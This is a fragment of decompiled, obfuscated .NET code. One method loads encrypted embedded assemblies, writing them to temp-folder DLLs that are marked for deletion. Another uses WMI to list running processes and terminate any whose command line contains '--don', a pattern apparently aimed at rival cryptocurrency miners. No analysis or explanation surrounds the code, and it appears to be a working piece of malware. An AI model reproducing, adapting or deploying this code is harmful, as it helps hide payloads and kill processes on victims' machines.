	static string smethod_46()
	{
		return "Software\\Red Gate\\" + Class11.smethod_13();
	}

	static Assembly smethod_47(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class7.Struct0 @struct = new Class7.Struct0(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezNiODFmYThjLTgzNGUtNGY1NC1hM2M3LWM5OTUzN2U1M2VlMn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{77006013-9578-4516-a6f7-36f0040e9ce0},ezNiODFmYThjLTgzNGUtNGY1NC1hM2M3LWM5OTUzN2U1M2VlMn0=,[z]{77006013-9578-4516-a6f7-36f0040e9ce0}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			lock (Class7.dictionary_0)
			{
				if (Class7.dictionary_0.ContainsKey(text2))
				{
					return Class7.dictionary_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class11.smethod_12(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class11.MoveFileEx(text5, (string)null, 4);
								Class11.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class7.dictionary_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static void smethod_48()
	{
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		object objectValue2 = default(object);
		IEnumerable enumerable = default(IEnumerable);
		string text = default(string);
		ManagementObjectSearcher val = default(ManagementObjectSearcher);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 335:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0029;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_0073;
						case 6:
							goto IL_007e;
						case 7:
							goto IL_0088;
						case 8:
							goto IL_00aa;
						case 9:
							goto IL_00d3;
						case 10:
						case 11:
							goto IL_00ee;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00d3:
					num = 9;
					NewLateBinding.LateCall(objectValue, (Type)null, "Terminate", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_00ee;
					IL_0007:
					num = 2;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts: {impersonationLevel=impersonate}!\\\\" + Environment.UserDomainName + "\\root\\cimv2", (string)null));
					goto IL_0029;
					IL_0029:
					num = 3;
					enumerable = (IEnumerable)RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "ExecQuery", new object[1] { "Select * from Win32_Process" }, (string[])null, (Type[])null, (bool[])null));
					goto IL_0056;
					IL_0056:
					num = 4;
					text = string.Format("select CommandLine from Win32_Process where Name='{0}'", RuntimeHelpers.GetObjectValue(Class11.smethod_41("Dgt/9RU8K0/UR2Wohqa4EA==")));
					goto IL_0073;
					IL_0073:
					num = 5;
					val = new ManagementObjectSearcher(text);
					goto IL_007e;
					IL_007e:
					num = 6;
					val.Get();
					goto IL_0088;
					IL_0088:
					num = 7;
					enumerator = enumerable.GetEnumerator();
					goto IL_0093;
					IL_0093:
					if (enumerator.MoveNext())
					{
						objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						goto IL_00aa;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000_2;
					IL_00ee:
					num = 11;
					goto IL_0093;
					IL_00aa:
					num = 8;
					if (NewLateBinding.LateGet(objectValue, (Type)null, "CommandLine", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()!.Contains("--don"))
					{
						goto IL_00d3;
					}
					goto IL_00ee;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 335;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
